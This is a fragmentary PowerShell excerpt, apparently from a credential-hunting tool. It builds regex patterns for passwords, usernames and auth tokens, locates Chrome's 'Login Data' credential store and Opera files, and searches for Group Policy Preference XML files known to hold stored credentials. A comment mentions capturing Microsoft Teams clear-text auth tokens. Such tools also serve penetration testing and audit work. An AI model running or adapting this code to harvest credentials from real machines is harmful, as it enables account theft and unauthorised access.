...
If($String -Match '(0\)n\.\{0,2\}\(=|:\)\.\[\^\$\]\{0,22\}\$\))$')
{
   ...
   $String = "$String" + "|((cp|p)ass.{0,4}`":.{0,22}$)|(^Password(\s:|:))|(`"(Pass.{0,5}|User.{0,4})`">)|(Username`":.{0,22}$)|([^$]Auth.{0,1}token(`"|\s*))" -join ''
}
...
If($AllPossible.IsPresent)
{
   ...
   $String = "(^(\s+U|U)ser.{0,4}(\s+`"|`"|`"+:|`"+>|\s+:|:|\s+=|=).[^$]{0,150}$)|(^(\s+p|\s+cp|cp|p)ass.{0,4}(\s+`"|`"|`"+:|`"+>|\s+:|:|\s+=|=).[^$])|(^(\s+p|p)wd(\s+`"|`"|`"+:|`"+>|\s+:|:|\s+=|=).[^$]{0,150}$)|(log(i|o)n(\s+`"|`"|`"+:|`"+>|\s+:|:|\s+=|=).[^$]{0,150}$)|(Username(\s+`"|`"|`"+:|`"+>|\s+:|:|\s+=|=).{0,150}$)|(Password(\s+`"|`"|`"+:|`"+>|\s+:|:|\s+=|=))|([^$]Auth.{0,1}token(`"|\s*))" 
}
Else
{
...
$ChromeFile = (Gci -Path "$Env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"|?{$_.PSIsContainer -eq $false -and $_.Length -gt 0}).FullName
...
$ChromeFile = (Gci -Path "$Env:LOCALAPPDATA\Programs\Opera*" -Recurse -Force|?{$_.PSIsContainer -eq $false -and $_.Name -iMatch '(installer_prefs.json)$'}).FullName
ForEach($ChromeData in $ChromeFile)
{
   $FileNames += "$ChromeData"
   $FilesCounter = $FilesCounter + 1
...
$XMLFiles = (Gci -Path "$Env:ALLUSERSPROFILE" -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force).FullName
If($XMLFiles)
{
...
## Microsoft Teams clear text authtokens capture
